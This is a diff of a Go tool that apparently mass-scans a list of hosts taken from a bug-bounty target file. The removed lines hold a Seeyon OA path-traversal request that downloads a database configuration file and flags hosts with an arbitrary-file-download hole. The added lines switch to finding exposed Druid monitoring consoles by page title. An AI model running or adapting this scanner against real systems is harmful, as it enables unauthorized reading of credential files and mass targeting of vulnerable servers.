@@ -28,21 +28,21 @@ var (
 	path        string
 	threads     int
 	timeout     int
+	titleRe = regexp.MustCompile(`>(.*?)\s?</title>`)
 
 )
 
 
 func init() {
-	threads  = 3                         // 线程数量
+	threads  = 3                        // 线程数量
 	timeout  = 2                         // 超时
-	path     = "/seeyon/webmail.do?method=doDownloadAtt&filename=index.jsp&filePath=../conf/datasourceCtp.properties"       // 请求路径
+	path     = "/druid/index.html"       // 请求路径
 	filename = "butian.txt"              // 读取路径
 	savename = "save.txt"                // 存储结果路径
 }
 
 
 func main() {
-
 	ch = make(chan bool, threads)
 	urllist , num, err := readLines(filename)
 	if err != nil {
@@ -53,7 +53,7 @@ func main() {
 
 
 	for _, v := range urllist {
-		urlpath := "http://" + v + path
+		urlpath := v + path
 		ch <- true
 		wg.Add(1)
 		go requestworker(urlpath)
@@ -95,21 +95,12 @@ func requestworker(url string) {
 	}
 
 	respBody := string(bodyss)
-
-	// 这里正则获取内容后需要改改
-	//m := titleRe.FindStringSubmatch(respBody)
-	matched, err := regexp.MatchString("DatabaseName", respBody)
-	if err != nil {
-		fmt.Println("正则匹配错误 ！ ",err)
-		os.Exit(0)		
+	m := titleRe.FindStringSubmatch(respBody)
+	if len(m) >= 2 {
+		if string(m[1]) == "Druid Stat Index" {
+			tracefile(url+"\n",savename)
+		}
 	}
-	if matched {
-		fmt.Println(url+"存在任意文件下载漏洞 ！")
-		tracefile(url+"\n",savename)
-	} else {
-		fmt.Println(url+"漏洞不存在 ！")
-	}
-
 }
 
 
